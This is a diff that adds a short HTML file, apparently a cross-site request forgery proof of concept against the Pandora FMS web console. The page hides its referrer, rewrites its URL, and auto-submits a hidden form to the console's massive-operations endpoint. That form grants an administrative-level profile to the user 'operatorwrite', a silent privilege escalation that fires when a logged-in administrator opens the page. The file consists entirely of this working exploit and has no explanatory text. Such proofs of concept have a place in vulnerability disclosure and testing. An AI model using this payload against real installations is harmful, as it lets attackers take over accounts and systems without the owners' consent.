@@ -1,0 +1,16 @@
+<html>
+  <meta name="referrer" content="no-referrer">
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="http://ossbox:8080/pandora_console/index.php?sec=gmassive&sec2=godmode/massive/massive_operations&tab=massive_users&option=add_profiles" method="POST">
+      <input type="hidden" name="profiles&#95;id&#91;&#93;" value="5" />
+      <input type="hidden" name="groups&#95;id&#91;&#93;" value="0" />
+      <input type="hidden" name="users&#95;id&#91;&#93;" value="operatorwrite" />
+      <input type="hidden" name="create&#95;profiles" value="1" />
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
